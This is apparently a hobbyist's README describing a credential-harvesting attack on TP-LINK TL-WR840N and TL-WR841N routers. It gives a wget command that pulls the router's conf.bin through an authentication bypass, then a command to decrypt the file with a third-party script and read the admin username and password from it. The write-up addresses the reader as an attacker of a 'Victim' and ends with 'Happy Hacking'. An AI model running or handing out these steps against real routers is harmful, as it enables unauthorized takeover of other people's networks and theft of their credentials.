Note: what follows is my first security related "Wow" moment. I was in high school and was just starting cybersec. I has many poor terms and errors. But, I've decided to left it as-is as a reminder how bad I'm at cybersec. Hope you like :slight_smile:

# TP-LINK Routers Admin Account Password Harvesting Vulnerability.
This **Vulnerability** basically uses another [Vulnerability](https://www.exploit-db.com/exploits/44781) which is a **limited authentication bypass vulnerability** using which it downloads the configuration file of the Router.

This **configuration file(conf.bin)** is the **most sensitive piece of information** that a **Hacker** would love to have of its **Victim.**
But this configuration file is **Encrypted** by the Vendor (Essentially **TP-LINK**).

*Fortunately,* This configuration file can be **Decrypted.** 

To Exploit this Vulnerability just follow the following guidelines:-

# The Game Show

## Getting The File

First of all you need to download the configuration file using the **Wget** utility using the following command:-
> wget -d --header="User-Agent: Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11" --header="Referer: http://192.168.0.1/mainFrame.htm" --header="Accept-Encoding: compress, gzip" http://192.168.0.1/cgi/conf.bin

You can customize the headers by yourself also but just remember not to omit the **Referer** Header.

Now, As you got the configuration file, next step is to decrypt it.

## Decrypting the File
As to decrypt the file you will need the file given in this repository.
I got this Decrypting Script from another Github [Repository](https://github.com/sta-c0000/tpconf_bin_xml) 
**Thanks "sta-c0000"**

Use the following command to decrypt the conf.bin file:-
>python3 decrypt.py conf.bin conf.xml

You can change the last argument to change the filename as desired.
In this .xml file you will find all the configuration of the router.
To Quickly find the admin username and password,search admin within the file.
Then you will find the AdminName and AdminPwd tags.
And their values will be in the *val* variable.
Like This:-
>
      <AdminName val=Alexis />
      <AdminPwd val=$up3rS3cuRePA$$W0rd! />

**Note:**
You will not be able to open the .xml file in most .xml editors due to some header problems.
Simply Open the file using Nano,Vim,Notepad++,etc.
**Please Note that if you not find these tags in the .xml file then the Victim is using Default Credentials.**

**Which Are:-**
*user: admin*
*password: admin*

# Affected Devices
At this time it is not known that how many devices are Vulnerable To this technique.
But the devices which i tested on are:

- TL-WR840N
- TL-WR841N

**Some Other Routers of TP-LINK are also vulnerable of a similar kind of attack**

- WL-WA850RE

[Link To the Repository](https://gist.github.com/eacmen/)

Happy Hacking!!! 🤑
